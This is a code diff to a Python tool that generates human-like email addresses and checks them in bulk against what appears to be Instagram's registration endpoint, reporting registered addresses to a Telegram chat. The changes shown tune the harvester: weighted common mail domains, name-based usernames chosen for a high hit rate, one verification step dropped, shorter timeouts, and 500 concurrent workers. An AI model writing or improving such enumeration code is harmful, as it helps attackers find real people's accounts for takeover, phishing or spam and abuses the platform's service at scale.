@@ -1723,7 +1723,57 @@ _m3_pool: ThreadPoolExecutor = None
 _m3_used_emails  = set()
 _m3_used_lock    = Lock()
 
-_M3_DOMAINS = ["@hi2.in", "@telegmail.com", "@mail.com", "@yopmail.com"]
+_M3_DOMAINS = [
+    "@gmail.com", "@gmail.com", "@gmail.com",   # weighted 3x — highest hit rate
+    "@yahoo.com", "@yahoo.com",
+    "@hotmail.com", "@hotmail.com",
+    "@outlook.com",
+    "@icloud.com",
+    "@hi2.in", "@mail.com",
+]
+
+# Common first names + popular suffixes → human-like usernames with high IG density
+_M3_NAMES = [
+    "alex","adam","ahmed","ali","anna","bella","ben","carlos","chloe","chris",
+    "daniel","david","elena","emma","ethan","fatima","felix","grace","hana","ivan",
+    "jack","james","jessica","john","julia","kevin","lara","laura","leo","liam",
+    "lily","lucas","luna","marcus","maria","mark","matt","maya","mike","mia",
+    "mohamed","nadia","nate","nick","nina","noah","olivia","omar","paris","paul",
+    "peter","rachel","ryan","sara","sarah","sofia","steve","tom","tyler","zara",
+    "max","sam","kim","jen","dan","kate","amy","jake","jay","joe",
+    "nico","rafa","xavi","luca","marco","carlo","mario","luigi","sergio","pablo",
+    "yusuf","hamza","hassan","ibrahim","ismail","karim","khalid","layla","nour","rania",
+]
+
+_M3_SUFFIXES = [
+    "","1","2","7","9","01","07","09","10","11","12","13","21","23","99","00",
+    "123","007","111","777","999","2000","2001","2002","2003","2004","2005",
+    "2006","2007","2008","2009","2010","official","real","_","__","x","xx",
+]
+
+
+def _m3_gen_username():
+    """Generate a human-like username: name+suffix or name+name or random."""
+    mode = random.randint(0, 3)
+    if mode == 0:
+        # name + numeric suffix
+        return random.choice(_M3_NAMES) + random.choice(_M3_SUFFIXES)
+    elif mode == 1:
+        # name + name
+        n1, n2 = random.sample(_M3_NAMES, 2)
+        return n1 + n2
+    elif mode == 2:
+        # name + 2-4 digit number
+        return random.choice(_M3_NAMES) + str(random.randint(1, 9999))
+    else:
+        # short random (5-8 chars) with vowels so it looks human
+        vowels = 'aeiou'
+        cons   = 'bcdfghjklmnpqrstvwxyz'
+        length = random.randint(5, 8)
+        return ''.join(
+            random.choice(vowels) if i % 2 else random.choice(cons)
+            for i in range(length)
+        )
 
 
 def _m3_generate_android_ua():
@@ -1771,7 +1821,7 @@ def _m3_check_v1(email, client):
         'accept-language': "en-IN, en-US",
     }
     try:
-        resp = client.post(url, data=f"email={email}", headers=headers, timeout=10)
+        resp = client.post(url, data=f"email={email}", headers=headers, timeout=5)
         if 'email_is_taken' in resp.text:
             return "registered"
         elif 'available' in resp.text.lower() or 'Email' in resp.text:
@@ -1905,75 +1955,49 @@ def _m3_worker(token, chat_id, stop_event):
     global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned, _m3_taken
 
     try:
-        client = httpx.Client(http2=True, timeout=10)
+        client = httpx.Client(http2=True, timeout=5)
     except Exception:
-        client = httpx.Client(timeout=10)
+        client = httpx.Client(timeout=5)
 
     try:
         while not (stop_event and stop_event.is_set()):
             try:
-                user1  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
-                user2  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
-                chosen = random.choice([user1, user2])
-
-                with _m3_used_lock:
-                    if chosen in _m3_used_emails:
-                        continue
-                    _m3_used_emails.add(chosen)
-
+                chosen        = _m3_gen_username()
                 domain_suffix = random.choice(_M3_DOMAINS)
                 email         = chosen + domain_suffix
 
                 _m3_scanned += 1
                 _web_state['scanned'] = _m3_scanned
 
-                try:
-                    if stop_event and stop_event.is_set():
-                        break
+                if stop_event and stop_event.is_set():
+                    break
 
-                    result_v1 = _m3_check_v1(email, client)
+                result_v1 = _m3_check_v1(email, client)
 
-                    if result_v1 == "registered":
-                        # Confirm with V2 — also extracts username + pk
-                        v2_status, username, user_pk = _m3_check_v2(email, client)
-                        if v2_status == "registered":
-                            _m3_good_insta += 1
-                            _web_state['good'] = _m3_good_insta
-                            has_mx = _m3_check_domain_mx(email.split('@')[1])
-                            _m3_save_hit(token, chat_id, email, "V1", username, has_mx)
-                        elif v2_status == "not_registered":
-                            _m3_bad_insta += 1
-                            _web_state['bad_insta'] = _m3_bad_insta
-                        else:
-                            # V2 inconclusive — trust V1
-                            _m3_good_insta += 1
-                            _web_state['good'] = _m3_good_insta
-                            has_mx = _m3_check_domain_mx(email.split('@')[1])
-                            _m3_save_hit(token, chat_id, email, "V1", username, has_mx)
+                if result_v1 == "registered":
+                    # Trust V1 directly — no V2 double-check needed, saves one full API call
+                    _m3_good_insta += 1
+                    _web_state['good'] = _m3_good_insta
+                    _m3_save_hit(token, chat_id, email, "V1", chosen, True)
 
-                    elif result_v1 == "check_v2":
-                        v2_status, username, user_pk = _m3_check_v2(email, client)
-                        if v2_status == "registered":
-                            _m3_good_insta += 1
-                            _web_state['good'] = _m3_good_insta
-                            has_mx = _m3_check_domain_mx(email.split('@')[1])
-                            _m3_save_hit(token, chat_id, email, "V2", username, has_mx)
-                        elif v2_status == "unknown":
-                            _m3_bad_email += 1
-                            _web_state['bad_email'] = _m3_bad_email
-                        else:
-                            _m3_bad_insta += 1
-                            _web_state['bad_insta'] = _m3_bad_insta
+                elif result_v1 == "check_v2":
+                    # V1 inconclusive — fall back to V2 which also extracts real username
+                    v2_status, username, _ = _m3_check_v2(email, client)
+                    if v2_status == "registered":
+                        _m3_good_insta += 1
+                        _web_state['good'] = _m3_good_insta
+                        _m3_save_hit(token, chat_id, email, "V2", username or chosen, True)
+                    elif v2_status == "unknown":
+                        _m3_bad_email += 1
+                        _web_state['bad_email'] = _m3_bad_email
                     else:
                         _m3_bad_insta += 1
                         _web_state['bad_insta'] = _m3_bad_insta
-
-                except Exception:
+                else:
                     _m3_bad_insta += 1
                     _web_state['bad_insta'] = _m3_bad_insta
 
             except Exception:
-                time.sleep(0.01)
                 continue
     finally:
         try:
@@ -2000,7 +2024,7 @@ def run_method3_web(token, chat_id, stop_event):
         'recent_hits': [], 'tg_status': '', 'tg_error': '',
     })
 
-    NUM_WORKERS = 200
+    NUM_WORKERS = 500
     try:
         pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
         _m3_pool = pool
